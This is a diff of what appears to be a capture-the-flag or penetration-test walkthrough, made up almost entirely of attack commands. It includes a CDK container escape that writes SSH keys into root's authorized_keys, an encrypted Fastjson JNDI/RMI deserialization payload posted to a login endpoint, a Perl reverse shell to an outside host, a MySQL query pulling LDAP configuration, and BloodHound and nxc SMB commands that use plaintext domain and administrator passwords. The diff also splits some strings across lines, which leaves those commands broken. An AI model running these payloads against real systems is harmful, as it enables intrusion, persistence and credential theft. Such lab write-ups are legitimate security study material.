@@ -42,38 +42,13 @@ PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 
 80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
 8080/tcp open  rtsp
-```
-
-
-
-```
 upx cdk_linux
-```
-
-
-
-```
 split -b 100k cdk_linux cdk.part.
-```
-
-
-
-```
 cat cdk.part.* > cdk_linux
-```
-
-
-
-```
 chmod +x ./cdk_linux
 ./cdk_linux evaluate --full
 ./cdk_linux run mount-procfs /host/proc/ "mkdir /root/.ssh/"
 ./cdk_linux run mount-procfs /host/proc/ 'echo xxxxxxxxx >> /root/.ssh/authorized_keys'
-```
-
-
-
-```
 import base64
 import os
 import json
@@ -84,7 +59,8 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
 # ===== 配置信息 =====
-SERVER_URL = "http://172.16.22.88:8080/api/login"
+SERVER_URL = "http://172.16.22.88:
+8080/api/login"
 
 # Java 代码中的 RSA 公钥（Base64 格式）
 PUBLIC_KEY_B64 = (
@@ -94,7 +70,8 @@ PUBLIC_KEY_B64 = (
 # ===== 1. 要发送的 JSON 明文 =====
 plaintext = """{
     "@type": "com.sun.rowset.JdbcRowSetImpl",
-    "dataSourceName": "rmi://172.16.22.12:50388/d3b02d",
+    "dataSourceName": "rmi://172.16.22.12:
+50388/d3b02d",
     "autoCommit": true
 }"""
 print(plaintext)
@@ -136,42 +113,13 @@ headers = {
 resp = requests.post(SERVER_URL, data=body_b64.encode("utf-8"), headers=headers, timeout=10)
 print("Status:", resp.status_code)
 print("Response:", resp.text)
-```
-
-
-
-```
 perl -e 'use Socket;$i="172.16.22.12";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
-```
-
-
-
-```
 ss -a -F /flag.txt
-```
-
-
-
-```
 mysql -uzabbix -ppassword -e "select * from zabbix.userdirectory_ldapG"
-```
-
-
-
-```
 bloodhound-ce-python -u ldapadmin -p XpVLGkQHm8 -d zwfw.com -dc DC.zwfw.com -ns 172.16.22.41 -c all --auth-method ntlm --dns-tcp --zip
-```
-
-
-
-```
 reg query "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon"
-```
-
-
-
-```
-nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO --codec GBK -x 'type C:UsersAdministratorDesktopflag.txt'
+nxc smb 172.16.22.41 -u administrator -p a4Z6FcRYSp6LLSGO --codec GBK -x 'type C:
+UsersAdministratorDesktopflag.txt'
 ```
 
 
